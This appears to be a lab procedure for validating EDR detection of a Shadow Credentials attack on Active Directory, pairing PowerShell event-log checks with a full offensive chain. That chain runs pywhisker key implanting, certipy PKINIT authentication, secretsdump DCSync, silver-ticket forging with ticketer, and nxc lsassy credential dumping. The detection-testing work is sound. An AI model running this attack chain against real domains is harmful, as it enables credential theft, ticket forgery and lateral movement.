# Shadow Credentials EDR Validation Procedure
**Version**: 2.0
**Last Updated**: 2026-03-10
**Purpose**: Complete step-by-step procedure for testing EDR detection capabilities against Shadow Credentials attacks

---

## Table of Contents
1. [Prerequisites](#prerequisites)
2. [Pre-Flight Checks](#pre-flight-checks)
3. [Environment Setup](#environment-setup)
4. [Attack Execution & Validation](#attack-execution--validation)
5. [EDR Verification](#edr-verification)
6. [Cleanup](#cleanup)
7. [Troubleshooting](#troubleshooting)

---

## Prerequisites

### Required Infrastructure
- **Domain Controller**: Windows Server 2016+ with AD DS role
- **Target Machine**: Domain-joined Windows Server/Workstation
- **Attack Machine**: Kali Linux or similar (with network access to DC)
- **Test Account**: Domain user with GenericAll or WriteProperty rights on target computer object

### Required Tools

#### Attack Machine (Kali Linux)
```bash
# Install required tools
pip install pywhisker certipy-ad impacket netexec

# Verify installation
which pywhisker certipy secretsdump.py ticketer.py nxc
```

#### Domain Controller (PowerShell)
- Ensure `kdc_pkinit_check.ps1` is available in the repository
- Active Directory PowerShell module installed

### Network Requirements
- Attack machine can reach DC on ports: 88 (Kerberos), 389/636 (LDAP), 445 (SMB)
- If using proxy: Configure `proxychains4` in `/etc/proxychains4.conf`

---

## Pre-Flight Checks

### Step 1: Verify AD Configuration on Domain Controller

Run the KDC PKINIT diagnostic script:

```powershell
# Execute on Domain Controller from repository root
.\kdc_pkinit_check.ps1 -TargetComputerName "EC2AMAZ-V903HM1"

# Review the output file in .\output\kdc_pkinit_check_YYYYMMDD_HHMMSS.txt
```

**Expected Results**:
- [x] Domain/Forest Functional Level >= Windows Server 2016 (behavior version >= 7)
- [x] Registry `SupportedEncryptionTypes` includes AES128 (0x8) + AES256 (0x10)
- [x] Target computer `msDS-SupportedEncryptionTypes` has AES bits set (0x18)
- [x] Valid KDC certificate with "KDC Authentication" EKU (OID 1.3.6.1.5.2.3.5)
- [x] KDC certificate is published in NTAuth store
- [x] KDC service is running
- [x] No recent KDC errors in System event log

**Common Fixes**:
```powershell
# Fix computer object encryption types
Set-ADComputer -Identity "TARGET$" -KerberosEncryptionType @('AES128','AES256')

# Publish KDC certificate to NTAuth (if missing)
certutil -dspublish -f "C:\path\to\kdc_cert.cer" NTAuthCA

# Restart KDC service after changes
Restart-Service KDC
```

### Step 2: Enable Audit Logging on Domain Controller

**Critical**: Without these settings, Event 5136 will NOT be generated.

#### 2.1 Enable Directory Service Changes Auditing

```powershell
# Check current policy
auditpol /get /subcategory:"Directory Service Changes"

# If not enabled, enable it
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
```

#### 2.2 Configure SACL on Target Object (Minimal Permissions)

**Recommended Method (PowerShell with minimal scope)**:
```powershell
# Define target
$targetComputer = "EC2AMAZ-V903HM1"
$targetDN = (Get-ADComputer -Identity $targetComputer).DistinguishedName

# Add SACL for msDS-KeyCredentialLink writes only (minimal noise)
# SDDL breakdown: S:ARAI(AU;SA;WP;{5b47d60f-6090-40b2-9f37-2a4de88f3063};WD)
# - AU: Audit
# - SA: Success Audit
# - WP: Write Property
# - {5b47d60f-6090-40b2-9f37-2a4de88f3063}: GUID for msDS-KeyCredentialLink
# - WD: Everyone
$sddl = "S:ARAI(AU;SA;WP;{5b47d60f-6090-40b2-9f37-2a4de88f3063};WD)"
dsacls $targetDN /S:"$sddl"

# Verify SACL is applied
(Get-Acl "AD:$targetDN" -Audit).Audit | Where-Object {
    $_.AuditFlags -match "Success" -and
    $_.ObjectType -eq '5b47d60f-6090-40b2-9f37-2a4de88f3063'
}
```

**Alternative Method (ADUC GUI - Use only if PowerShell unavailable)**:
1. Open Active Directory Users and Computers
2. Enable Advanced Features (View > Advanced Features)
3. Navigate to target computer object > Properties > Security > Advanced > Auditing
4. Add auditing entry:
   - Principal: Everyone
   - Type: Success
   - Applies to: This object only
   - Permissions: Specific property > msDS-KeyCredentialLink (NOT "Write all properties")

**Expected Output** (PowerShell verification):
```
AuditFlags          : Success
ObjectType          : 5b47d60f-6090-40b2-9f37-2a4de88f3063
InheritedObjectType : 00000000-0000-0000-0000-000000000000
ActiveDirectoryRights : WriteProperty
```

### Step 3: Verify Test Account Permissions

```powershell
# Check if test account has write permissions on target
Import-Module ActiveDirectory

$targetComputer = "EC2AMAZ-V903HM1"
$targetDN = (Get-ADComputer -Identity $targetComputer).DistinguishedName
$acl = Get-Acl "AD:$targetDN"

# Look for GenericAll or WriteProperty permissions for your test account
$acl.Access | Where-Object {
    $_.IdentityReference -like "*Administrator*" -and
    ($_.ActiveDirectoryRights -match "GenericAll|WriteProperty")
}
```

If no permissions exist, grant minimal required permissions:
```powershell
# WARNING: Only in test environments
# Grant write permission for msDS-KeyCredentialLink only
dsacls $targetDN /G "sme\Administrator:WP;msDS-KeyCredentialLink"
```

---

## Environment Setup

### Step 4: Configure Attack Machine Environment

```bash
# Set environment variables (adjust to your lab)
export DOMAIN="sme.local"
export USER="Administrator"
export PASS="YourPassword"
export DC_IP="10.0.0.206"
export TARGET="EC2AMAZ-V903HM1"
export PROXY="proxychains4"  # Remove if not using proxy

# Create working directory
mkdir -p /tmp/sc_edr_demo
cd /tmp/sc_edr_demo

# Test connectivity
ping -c 2 $DC_IP
nmap -p 88,389,445,636 $DC_IP
```

**Expected**: DC is reachable, all ports open

---

## Attack Execution & Validation

### Step 5: Attack Chain - Step 1 (Reconnaissance)

**Action**: List existing KeyCredentials on target

```bash
$PROXY pywhisker -d $DOMAIN -u $USER -p $PASS --dc-ip $DC_IP -t $TARGET$ --action list
```

**Expected Output**:
```
[*] Searching for the target account
[*] Target user found: CN=EC2AMAZ-V903HM1,CN=Computers,DC=sme,DC=local
[*] Attribute msDS-KeyCredentialLink is empty
```

**EDR Check Point**:
- **No Event 5136 is expected** - This is a read operation; Event 5136 only fires on modifications
- This step validates connectivity and target existence

---

### Step 6: Attack Chain - Step 2 (Implant Shadow Credentials)

**Action**: Inject attacker public key into target's msDS-KeyCredentialLink attribute

```bash
$PROXY pywhisker -d $DOMAIN -u $USER -p $PASS --dc-ip $DC_IP \
    -t $TARGET$ --action add \
    --filename /tmp/sc_edr_demo/shadow.pfx \
    --password 'ComplexP@ssw0rd123!'
```

**Expected Output**:
```
[*] Searching for the target account
[*] Target user found: CN=EC2AMAZ-V903HM1,CN=Computers,DC=sme,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: a1b2c3d4-...
[*] Updating the msDS-KeyCredentialLink attribute of EC2AMAZ-V903HM1$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saved PFX certificate at: /tmp/sc_edr_demo/shadow.pfx
```

**Save DeviceID for cleanup**: `export DEVICE_ID="a1b2c3d4-..."`

**CRITICAL EDR Check**:
```powershell
# Run on DC immediately after attack
$targetComputer = "EC2AMAZ-V903HM1"
$startTime = (Get-Date).AddMinutes(-2)

Write-Host "`n=== EVENT 5136: Directory Service Object Modified ===" -ForegroundColor Yellow

# Robust event parsing using XML Properties
$events5136 = Get-WinEvent -FilterHashtable @{LogName='Security';ID=5136;StartTime=$startTime} -ErrorAction SilentlyContinue |
Where-Object {
    $xml = [xml]$_.ToXml()
    $eventData = $xml.Event.EventData.Data
    $objectDN = ($eventData | Where-Object {$_.Name -eq 'ObjectDN'}).'#text'
    $attributeLDAPDisplayName = ($eventData | Where-Object {$_.Name -eq 'AttributeLDAPDisplayName'}).'#text'

    $objectDN -like "*$targetComputer*" -and $attributeLDAPDisplayName -eq 'msDS-KeyCredentialLink'
}

if ($events5136) {
    Write-Host "  [PASS] Event 5136 detected ($($events5136.Count) event(s))" -ForegroundColor Green
    foreach ($evt in $events5136) {
        $xml = [xml]$evt.ToXml()
        $eventData = $xml.Event.EventData.Data

        Write-Host "`nTimeCreated : $($evt.TimeCreated)"
        Write-Host "ObjectDN    : $(($eventData | Where-Object {$_.Name -eq 'ObjectDN'}).'#text')"
        Write-Host "Attribute   : $(($eventData | Where-Object {$_.Name -eq 'AttributeLDAPDisplayName'}).'#text')"
        Write-Host "OperationType: $(($eventData | Where-Object {$_.Name -eq 'OperationType'}).'#text')"
        Write-Host "SubjectUserName: $(($eventData | Where-Object {$_.Name -eq 'SubjectUserName'}).'#text')"
    }
} else {
    Write-Host "  [FAIL] Event 5136 NOT detected" -ForegroundColor Red
    Write-Host "  ACTION: Verify audit policy and SACL configuration (Step 2)" -ForegroundColor Yellow
}
```

**Expected**: Event 5136 with:
- ObjectDN: `CN=EC2AMAZ-V903HM1,...`
- AttributeLDAPDisplayName: `msDS-KeyCredentialLink`
- OperationType: `%%14674` (Value Added)

**If no Event 5136**: Check Pre-Flight Step 2 (audit configuration)

---

### Step 7: Attack Chain - Step 3 (PKINIT Authentication)

**Action**: Use certificate to request Kerberos TGT via PKINIT

```bash
$PROXY certipy auth -pfx /tmp/sc_edr_demo/shadow.pfx \
    -dc-ip $DC_IP \
    -domain $DOMAIN \
    -username $TARGET
```

**Possible Outputs**:

**Scenario A - Success**:
```
[*] Using principal: ec2amaz-v903hm1$@sme.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ec2amaz-v903hm1.ccache'
[*] Trying to retrieve NT hash for 'ec2amaz-v903hm1$'
[*] Got hash for 'ec2amaz-v903hm1$@sme.local': aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
```

**Scenario B - KDC_ERR_PADATA_TYPE_NOSUPP** (Still validates attack path):
```
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP
```
This error means KDC doesn't support PKINIT, but the Shadow Credentials implant succeeded. Refer to Pre-Flight Step 1.

**EDR Check**:
```powershell
$targetComputer = "EC2AMAZ-V903HM1"
$startTime = (Get-Date).AddMinutes(-2)

Write-Host "`n=== EVENT 4768: Kerberos TGT Request ===" -ForegroundColor Yellow

# Robust event parsing using XML Properties
$events4768 = Get-WinEvent -FilterHashtable @{LogName='Security';ID=4768;StartTime=$startTime} -ErrorAction SilentlyContinue |
Where-Object {
    $xml = [xml]$_.ToXml()
    $eventData = $xml.Event.EventData.Data
    $accountName = ($eventData | Where-Object {$_.Name -eq 'AccountName'}).'#text'
    $accountName -like "$targetComputer*"
}

if ($events4768) {
    Write-Host "  [PASS] Event 4768 detected ($($events4768.Count) event(s))" -ForegroundColor Green
    foreach ($evt in $events4768) {
        $xml = [xml]$evt.ToXml()
        $eventData = $xml.Event.EventData.Data

        Write-Host "`nTimeCreated     : $($evt.TimeCreated)"
        Write-Host "AccountName     : $(($eventData | Where-Object {$_.Name -eq 'AccountName'}).'#text')"
        Write-Host "Status          : $(($eventData | Where-Object {$_.Name -eq 'Status'}).'#text')"
        Write-Host "PreAuthType     : $(($eventData | Where-Object {$_.Name -eq 'PreAuthType'}).'#text')"
    }
} else {
    Write-Host "  [WARN] Event 4768 NOT detected or filtered" -ForegroundColor Yellow
}
```

**Expected**: Event 4768 with PreAuthType 16 (PA-PK-AS-REQ) or 19

---

### Step 8: Attack Chain - Step 4 (Dump NT Hash)

**Action**: Extract target machine NT hash via DCSync-like operation

```bash
$PROXY secretsdump.py $DOMAIN/$USER:$PASS@$DC_IP -just-dc-user $TARGET$
```

**Expected Output**:
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
sme.local\EC2AMAZ-V903HM1$:1103:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::
[*] Kerberos keys grabbed
EC2AMAZ-V903HM1$:aes256-cts-hmac-sha1-96:<AES256_KEY>
[*] Cleaning up...
```

**Save the NT hash and Domain SID**:
```bash
export TARGET_HASH="<NT_HASH_from_above>"
export DOMAIN_SID="S-1-5-21-..."  # Extract from output or use lookupsid.py
```

Get Domain SID if not shown:
```bash
$PROXY lookupsid.py $DOMAIN/$USER:$PASS@$DC_IP | grep "Domain SID"
```

**EDR Check**:
```powershell
$startTime = (Get-Date).AddMinutes(-2)

Write-Host "`n=== EVENT 4624: Logon Success ===" -ForegroundColor Yellow

# Robust event parsing using XML Properties
$events4624 = Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624;StartTime=$startTime} -ErrorAction SilentlyContinue |
Where-Object {
    $xml = [xml]$_.ToXml()
    $eventData = $xml.Event.EventData.Data
    $logonType = ($eventData | Where-Object {$_.Name -eq 'LogonType'}).'#text'
    $targetUserName = ($eventData | Where-Object {$_.Name -eq 'TargetUserName'}).'#text'

    $logonType -eq '3' -and $targetUserName -eq 'Administrator'
}

if ($events4624) {
    Write-Host "  [PASS] Event 4624 detected ($($events4624.Count) event(s))" -ForegroundColor Green
    $events4624 | Select-Object -First 5 | ForEach-Object {
        $xml = [xml]$_.ToXml()
        $eventData = $xml.Event.EventData.Data
        Write-Host "  $($_.TimeCreated) - LogonType: $(($eventData | Where-Object {$_.Name -eq 'LogonType'}).'#text')"
    }
} else {
    Write-Host "  [INFO] Event 4624 not detected or filtered" -ForegroundColor Gray
}
```

**Expected**: Event 4624 (Logon Type 3 - Network)

---

### Step 9: Attack Chain - Step 5 (Forge Silver Ticket)

**Action**: Create forged service ticket for CIFS access

```bash
ticketer.py -nthash $TARGET_HASH \
    -domain-sid $DOMAIN_SID \
    -domain $DOMAIN \
    -spn cifs/$TARGET.$DOMAIN \
    Administrator \
    -outputfile /tmp/sc_edr_demo/administrator.ccache
```

**Expected Output**:
```
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sme.local/Administrator
[*] PAC_LOGON_INFO
[*] Saving ticket in administrator.ccache
```

**Verify ticket**:
```bash
export KRB5CCNAME=/tmp/sc_edr_demo/administrator.ccache
klist  # Should show ticket for cifs/EC2AMAZ-V903HM1.sme.local
```

**EDR Check**:
```powershell
$startTime = (Get-Date).AddMinutes(-2)

Write-Host "`n=== EVENT 4769: Service Ticket Request ===" -ForegroundColor Yellow

# Robust event parsing using XML Properties
$events4769 = Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769;StartTime=$startTime} -ErrorAction SilentlyContinue |
Where-Object {
    $xml = [xml]$_.ToXml()
    $eventData = $xml.Event.EventData.Data
    $serviceName = ($eventData | Where-Object {$_.Name -eq 'ServiceName'}).'#text'
    $targetUserName = ($eventData | Where-Object {$_.Name -eq 'TargetUserName'}).'#text'

    $serviceName -like 'cifs*' -or $targetUserName -eq 'Administrator'
}

if ($events4769) {
    Write-Host "  [PASS] Event 4769 detected ($($events4769.Count) event(s))" -ForegroundColor Green
    $events4769 | Select-Object -First 5 | ForEach-Object {
        $xml = [xml]$_.ToXml()
        $eventData = $xml.Event.EventData.Data
        Write-Host "  $($_.TimeCreated) - Service: $(($eventData | Where-Object {$_.Name -eq 'ServiceName'}).'#text')"
    }
} else {
    Write-Host "  [WARN] Event 4769 NOT detected or filtered" -ForegroundColor Yellow
}
```

---

### Step 10: Attack Chain - Step 6 (Lateral Movement Validation)

**Action**: Access target machine using forged ticket

```bash
# Ensure ticket is loaded
export KRB5CCNAME=/tmp/sc_edr_demo/administrator.ccache

# Test SMB access
$PROXY nxc smb $TARGET.$DOMAIN -u Administrator -k --use-kcache --shares

# Attempt credential dumping (requires admin privileges)
$PROXY nxc smb $TARGET.$DOMAIN -u Administrator -k --use-kcache -M lsassy
```

**Expected Output** (if successful):
```
SMB         10.0.0.X        445    EC2AMAZ-V903HM1  [*] Windows Server 2022 Build 20348
SMB         10.0.0.X        445    EC2AMAZ-V903HM1  [+] sme.local\Administrator (Pwn3d!)
SMB         10.0.0.X        445    EC2AMAZ-V903HM1  [+] Enumerated shares
SMB         10.0.0.X        445    EC2AMAZ-V903HM1      ADMIN$    READ,WRITE
SMB         10.0.0.X        445    EC2AMAZ-V903HM1      C$        READ,WRITE
```

**CRITICAL EDR Check**:
```powershell
$targetComputer = "EC2AMAZ-V903HM1"
$startTime = (Get-Date).AddMinutes(-2)

Write-Host "`n=== EVENT 5145: Network Share Access ===" -ForegroundColor Yellow

# Robust event parsing using XML Properties
$events5145 = Get-WinEvent -FilterHashtable @{LogName='Security';ID=5145;StartTime=$startTime} -ErrorAction SilentlyContinue |
Where-Object {
    $xml = [xml]$_.ToXml()
    $eventData = $xml.Event.EventData.Data
    $subjectUserName = ($eventData | Where-Object {$_.Name -eq 'SubjectUserName'}).'#text'
    $shareName = ($eventData | Where-Object {$_.Name -eq 'ShareName'}).'#text'

    $subjectUserName -eq 'Administrator' -and $shareName -like '*$'
}

if ($events5145) {
    Write-Host "  [PASS] Event 5145 detected ($($events5145.Count) event(s))" -ForegroundColor Green
    $events5145 | Select-Object -First 5 | ForEach-Object {
        $xml = [xml]$_.ToXml()
        $eventData = $xml.Event.EventData.Data
        Write-Host "  $($_.TimeCreated) - Share: $(($eventData | Where-Object {$_.Name -eq 'ShareName'}).'#text')"
    }
} else {
    Write-Host "  [WARN] Event 5145 NOT detected or filtered" -ForegroundColor Yellow
}
```

**Expected**: Event 5145 showing file share access via Administrator account

---

## EDR Verification

### Step 11: Comprehensive EDR Assessment

Create and run the validation script:

```powershell
# Save this as Validate-ShadowCredentialsEDR.ps1
param(
    [Parameter(Mandatory=$true)]
    [string]$TargetComputer,
    [Parameter(Mandatory=$false)]
    [int]$MinutesBack = 15
)

$ErrorActionPreference = "SilentlyContinue"
$startTime = (Get-Date).AddMinutes(-$MinutesBack)

Write-Host "`n=====================================================" -ForegroundColor Green
Write-Host "  Shadow Credentials EDR Detection Validation Report" -ForegroundColor Green
Write-Host "=====================================================" -ForegroundColor Green
Write-Host "Target: $TargetComputer"
Write-Host "Period: $startTime to $(Get-Date)`n"

# Validation results
$detectionResults = [ordered]@{
    "Event 5136 (Shadow Credentials Implant)" = $false
    "Event 4768 (PKINIT TGT Request)" = $false
    "Event 4769 (Service Ticket Request)" = $false
    "Event 5145 (File Share Access)" = $false
}

# Function to parse event data using XML
function Get-EventDataValue {
    param($Event, $FieldName)
    $xml = [xml]$Event.ToXml()
    $value = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq $FieldName}).'#text'
    return $value
}

# Check Event 5136
Write-Host "[1/4] Checking Event 5136: Directory Service Modification..." -ForegroundColor Cyan
$evt5136 = Get-WinEvent -FilterHashtable @{LogName='Security';ID=5136;StartTime=$startTime} |
Where-Object {
    (Get-EventDataValue -Event $_ -FieldName 'ObjectDN') -like "*$TargetComputer*" -and
    (Get-EventDataValue -Event $_ -FieldName 'AttributeLDAPDisplayName') -eq 'msDS-KeyCredentialLink'
}

if ($evt5136) {
    Write-Host "  PASS Event 5136 detected ($($evt5136.Count) event(s))" -ForegroundColor Green
    $detectionResults["Event 5136 (Shadow Credentials Implant)"] = $true
    $evt5136 | ForEach-Object {
        Write-Host "  $($_.TimeCreated) - Subject: $(Get-EventDataValue -Event $_ -FieldName 'SubjectUserName')"
    }
} else {
    Write-Host "  FAIL Event 5136 NOT detected" -ForegroundColor Red
    Write-Host "       ACTION: Verify audit policy and SACL configuration" -ForegroundColor Yellow
}

# Check Event 4768
Write-Host "`n[2/4] Checking Event 4768: Kerberos TGT Request..." -ForegroundColor Cyan
$evt4768 = Get-WinEvent -FilterHashtable @{LogName='Security';ID=4768;StartTime=$startTime} |
Where-Object {
    (Get-EventDataValue -Event $_ -FieldName 'TargetUserName') -like "$TargetComputer*"
}

if ($evt4768) {
    Write-Host "  PASS Event 4768 detected ($($evt4768.Count) event(s))" -ForegroundColor Green
    $detectionResults["Event 4768 (PKINIT TGT Request)"] = $true
    $evt4768 | Select-Object -First 3 | ForEach-Object {
        Write-Host "  $($_.TimeCreated) - Account: $(Get-EventDataValue -Event $_ -FieldName 'TargetUserName')"
    }
} else {
    Write-Host "  WARN Event 4768 NOT detected or filtered" -ForegroundColor Yellow
}

# Check Event 4769
Write-Host "`n[3/4] Checking Event 4769: Service Ticket Request..." -ForegroundColor Cyan
$evt4769 = Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769;StartTime=$startTime} |
Where-Object {
    $svc = Get-EventDataValue -Event $_ -FieldName 'ServiceName'
    $user = Get-EventDataValue -Event $_ -FieldName 'TargetUserName'
    $svc -like 'cifs*' -or $user -eq 'Administrator'
}

if ($evt4769) {
    Write-Host "  PASS Event 4769 detected ($($evt4769.Count) event(s))" -ForegroundColor Green
    $detectionResults["Event 4769 (Service Ticket Request)"] = $true
    $evt4769 | Select-Object -First 3 | ForEach-Object {
        Write-Host "  $($_.TimeCreated) - Service: $(Get-EventDataValue -Event $_ -FieldName 'ServiceName')"
    }
} else {
    Write-Host "  WARN Event 4769 NOT detected or filtered" -ForegroundColor Yellow
}

# Check Event 5145
Write-Host "`n[4/4] Checking Event 5145: Network Share Access..." -ForegroundColor Cyan
$evt5145 = Get-WinEvent -FilterHashtable @{LogName='Security';ID=5145;StartTime=$startTime} |
Where-Object {
    (Get-EventDataValue -Event $_ -FieldName 'SubjectUserName') -eq 'Administrator'
}

if ($evt5145) {
    Write-Host "  PASS Event 5145 detected ($($evt5145.Count) event(s))" -ForegroundColor Green
    $detectionResults["Event 5145 (File Share Access)"] = $true
    $evt5145 | Select-Object -First 3 | ForEach-Object {
        Write-Host "  $($_.TimeCreated) - Share: $(Get-EventDataValue -Event $_ -FieldName 'ShareName')"
    }
} else {
    Write-Host "  WARN Event 5145 NOT detected or filtered" -ForegroundColor Yellow
}

# Final Summary
Write-Host "`n=====================================================" -ForegroundColor Green
Write-Host "  EDR Detection Summary" -ForegroundColor Green
Write-Host "=====================================================" -ForegroundColor Green

$passCount = ($detectionResults.Values | Where-Object {$_ -eq $true}).Count
$totalChecks = $detectionResults.Count
$score = [math]::Round(($passCount / $totalChecks) * 100, 0)

foreach ($check in $detectionResults.GetEnumerator()) {
    $status = if ($check.Value) { "PASS" } else { "FAIL" }
    $color = if ($check.Value) { "Green" } else { "Red" }
    Write-Host "$status $($check.Key)" -ForegroundColor $color
}

Write-Host "`nDetection Score: $passCount/$totalChecks ($score%)" -ForegroundColor $(
    if ($score -ge 75) {"Green"}
    elseif ($score -ge 50) {"Yellow"}
    else {"Red"}
)

if ($score -lt 100) {
    Write-Host "`nRECOMMENDATIONS:" -ForegroundColor Yellow
    if (-not $detectionResults["Event 5136 (Shadow Credentials Implant)"]) {
        Write-Host "  - Enable Directory Service Changes audit policy" -ForegroundColor Yellow
        Write-Host "  - Configure SACL on sensitive computer objects" -ForegroundColor Yellow
    }
    if (-not $detectionResults["Event 4768 (PKINIT TGT Request)"]) {
        Write-Host "  - Review Kerberos authentication audit settings" -ForegroundColor Yellow
    }
    if (-not $detectionResults["Event 5145 (File Share Access)"]) {
        Write-Host "  - Enable file share access auditing" -ForegroundColor Yellow
    }
}

return @{
    Score = $score
    PassCount = $passCount
    TotalChecks = $totalChecks
    Results = $detectionResults
}

**Run the validation**:
```powershell
.\Validate-ShadowCredentialsEDR.ps1 -TargetComputer "EC2AMAZ-V903HM1" -MinutesBack 15
```

**Success Criteria**:
- Minimum 3/4 events detected (75% score)
- Event 5136 is MANDATORY (core attack detection)

---

## Cleanup

### Step 12: Remove Shadow Credentials

```bash
# List current KeyCredentials to find DeviceID
$PROXY pywhisker -d $DOMAIN -u $USER -p $PASS --dc-ip $DC_IP -t $TARGET$ --action list

# Remove the implanted credential (use DeviceID from Step 6)
$PROXY pywhisker -d $DOMAIN -u $USER -p $PASS --dc-ip $DC_IP \
    -t $TARGET$ --action remove --device-id $DEVICE_ID
```

**Expected Output**:
```
[*] Searching for the target account
[*] Target user found: CN=EC2AMAZ-V903HM1,...
[*] Found value in msDS-KeyCredentialLink
[+] Removed the KeyCredential with DeviceID: a1b2c3d4-...
```

**Verify removal**:
```bash
$PROXY pywhisker -d $DOMAIN -u $USER -p $PASS --dc-ip $DC_IP -t $TARGET$ --action list
# Should show: "Attribute msDS-KeyCredentialLink is empty"
```

### Step 13: Clean Local Artifacts

```bash
# Remove all local files
rm -rf /tmp/sc_edr_demo/

# Clear environment variables
unset KRB5CCNAME DOMAIN USER PASS DC_IP TARGET TARGET_HASH DOMAIN_SID DEVICE_ID PROXY

# Clear Kerberos ticket cache
kdestroy -A 2>/dev/null || true

# Verify cleanup
ls -la /tmp/sc_edr_demo/  # Should not exist
klist  # Should show no tickets
```

### Step 14: Archive Test Results

On Domain Controller:
```powershell
# Create test report archive
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$reportDir = "C:\EDR_Tests\ShadowCredentials_$timestamp"
New-Item -ItemType Directory -Path $reportDir -Force

# Export security events from test period
$startTime = (Get-Date).AddHours(-1)
Get-WinEvent -FilterHashtable @{LogName='Security';ID=5136,4768,4769,5145;StartTime=$startTime} |
Export-Csv "$reportDir\SecurityEvents.csv" -NoTypeInformation

# Copy KDC check output (adjust path to repo root)
Copy-Item ".\output\kdc_pkinit_check_*.txt" $reportDir -ErrorAction SilentlyContinue

Write-Host "Test results archived to: $reportDir" -ForegroundColor Green
```

---

## Troubleshooting

### Issue 1: No Event 5136 Generated

**Symptoms**: Step 6 completes successfully but no Event 5136 appears

**Diagnosis**:
```powershell
# Check audit policy
auditpol /get /subcategory:"Directory Service Changes"

# Check SACL on target object
$targetComputer = "EC2AMAZ-V903HM1"
$targetDN = (Get-ADComputer -Identity $targetComputer).DistinguishedName
(Get-Acl "AD:$targetDN" -Audit).Audit
```

**Solution**:
```powershell
# Enable audit policy
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable

# Add SACL with minimal scope (msDS-KeyCredentialLink only)
$sddl = "S:ARAI(AU;SA;WP;{5b47d60f-6090-40b2-9f37-2a4de88f3063};WD)"
dsacls $targetDN /S:"$sddl"

# Verify
(Get-Acl "AD:$targetDN" -Audit).Audit | Where-Object {
    $_.ObjectType -eq '5b47d60f-6090-40b2-9f37-2a4de88f3063'
}

# Wait 2-3 minutes for policy propagation, then retry attack
```

### Issue 2: KDC_ERR_PADATA_TYPE_NOSUPP

**Symptoms**: Step 7 fails with "KDC_ERR_PADATA_TYPE_NOSUPP"

**Diagnosis**: Run `.\kdc_pkinit_check.ps1` from repository root and review:
- Section 4: KDC Certificate presence
- Section 5: NTAuth store contents

**Common Causes**:
1. No KDC certificate installed
2. KDC certificate missing "KDC Authentication" EKU
3. Certificate not published to NTAuth store
4. Certificate expired or chain invalid

**Solution**:
```powershell
# If using AD CS, request new KDC certificate
certreq -submit -attrib "CertificateTemplate:KerberosAuthentication"

# Publish to NTAuth
certutil -dspublish -f "C:\path\to\kdc_cert.cer" NTAuthCA

# Verify
certutil -viewstore -enterprise NTAuth

# Restart KDC
Restart-Service KDC
```

### Issue 3: Network Connectivity Issues

**Symptoms**: `nxc` or `certipy` fails with "No route to host" or timeout

**Diagnosis**:
```bash
# Test basic connectivity
ping $DC_IP
nmap -p 88,389,445,636 $DC_IP

# Test with/without proxy
certipy auth -pfx /tmp/sc_edr_demo/shadow.pfx -dc-ip $DC_IP -domain $DOMAIN -username $TARGET
proxychains4 certipy auth -pfx /tmp/sc_edr_demo/shadow.pfx -dc-ip $DC_IP -domain $DOMAIN -username $TARGET
```

**Solution**:
- Verify `/etc/proxychains4.conf` if using proxy
- Check firewall rules on DC
- Ensure DNS resolution works: `nslookup $DOMAIN $DC_IP`

### Issue 4: Permission Denied

**Symptoms**: Step 6 fails with "Insufficient access rights"

**Diagnosis**:
```powershell
# Check effective permissions
$targetComputer = "EC2AMAZ-V903HM1"
$targetDN = (Get-ADComputer -Identity $targetComputer).DistinguishedName
$acl = Get-Acl "AD:$targetDN"
$acl.Access | Where-Object {$_.IdentityReference -like "*Administrator*"}
```

**Solution**:
```powershell
# Grant WriteProperty on msDS-KeyCredentialLink only
dsacls $targetDN /G "sme\Administrator:WP;msDS-KeyCredentialLink"
```

### Issue 5: Forged Ticket Not Working

**Symptoms**: Step 10 fails to access shares despite valid ticket

**Diagnosis**:
```bash
# Verify ticket is loaded
klist

# Check ticket details
klist -e  # Should show encryption type

# Try with different SPNs
ticketer.py -nthash $TARGET_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN \
    -spn HOST/$TARGET.$DOMAIN Administrator
```

**Solution**:
- Ensure NT hash is correct (re-run Step 8)
- Verify Domain SID matches domain
- Try authenticating with -debug flag on nxc
- Check target machine firewall (port 445)

---

## Validation Checklist

Before reporting results, verify:

- [ ] All 6 attack steps completed without errors
- [ ] Event 5136 detected (MANDATORY)
- [ ] At least 2 additional events detected (4768, 4769, or 5145)
- [ ] EDR alerts reviewed (if applicable)
- [ ] Shadow Credentials removed from target
- [ ] Local artifacts cleaned
- [ ] Test results archived

**Detection Score Interpretation**:
- **100%**: Excellent coverage
- **75-99%**: Good coverage, minor gaps
- **50-74%**: Moderate coverage, significant gaps
- **<50%**: Poor coverage, major blind spots

---

## Notes

1. **Authorization**: Only perform this test in authorized lab environments with written permission
2. **Impact**: This test modifies Active Directory objects. Always clean up after testing
3. **Timing**: Allow 1-2 minutes between steps for event propagation
4. **Logging**: Keep detailed logs of all commands and outputs for reporting
5. **EDR Alerts**: If EDR blocks any step, that is a PASS for that detection point

**Document Version**: 2.0
**Compatibility**: Windows Server 2016+, Kali Linux 2023.1+
**Test Duration**: Approximately 30-45 minutes